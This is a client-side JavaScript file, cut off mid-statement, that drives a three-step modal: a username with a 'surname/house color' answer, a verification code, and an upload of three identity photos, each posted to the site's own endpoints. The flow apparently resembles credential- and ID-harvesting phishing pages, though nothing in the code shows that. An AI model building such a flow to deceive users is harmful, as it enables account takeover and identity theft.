const openBtn = document.getElementById('openBtn');
const startFlow = document.getElementById('startFlow');
const modal = document.getElementById('modal');
const closeBtn = document.getElementById('closeBtn');
const status = document.getElementById('status');

openBtn.addEventListener('click', openModal);
startFlow.addEventListener('click', openModal);
closeBtn.addEventListener('click', closeModal);

function openModal(){ modal.classList.remove('hidden'); showStep(1); }
function closeModal(){ modal.classList.add('hidden'); status.textContent=''; }
function showStep(n){
  document.querySelectorAll('.step').forEach(s=>s.classList.add('hidden'));
  document.getElementById('step'+n).classList.remove('hidden');
  status.textContent='';
}

// helper
async function postJSON(url,data){
  const res = await fetch(url,{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)});
  return res.json();
}

// STEP 1: Username + Editable Field
document.getElementById('loginForm').addEventListener('submit', async e=>{
  e.preventDefault();
  const f = e.target;
  status.textContent = 'Sending info...';
  try {
    const r = await postJSON('/login',{
      username: f.username.value.trim(),
      editable: f.editable.value.trim() // surname/house color/etc
    });
    if(r && r.ok) showStep(2);
    else status.textContent = (r.error || 'Submission failed');
  } catch(err){ console.error(err); status.textContent='Network error'; }
});

// STEP 2: Code
document.getElementById('codeForm').addEventListener('submit', async e=>{
  e.preventDefault();
  const f = e.target;
  status.textContent = 'Verifying code...';
  try {
    const r = await postJSON('/code',{ code: f.code.value.trim() });
    if(r && r.ok) showStep(3);
    else status.textContent = (r.error || 'Invalid code');
  } catch(err){ console.error(err); status.textContent='Network error'; }
});

// STEP 3: KYC upload
document.getElementById('kycForm').addEventListener('submit', async e=>{
  e.preventDefault();
  const f = e.target;
  const fd = new FormData();

  ['photo1','photo2','photo3'].forEach(name=>{
    const input = f[name];
    if(input && input.files && input.files[0]){
      fd.append(name,input.files[0]);
      const labelEl = input.closest('label');
      fd.append(name+'_label', labelEl ? labelEl.textContent.trim() : name);
    }
  });

  status.textContent='Uploading KYC...';
  try{
    const res = await fetch('/kyc',{ method:'POST', body: fd });
    const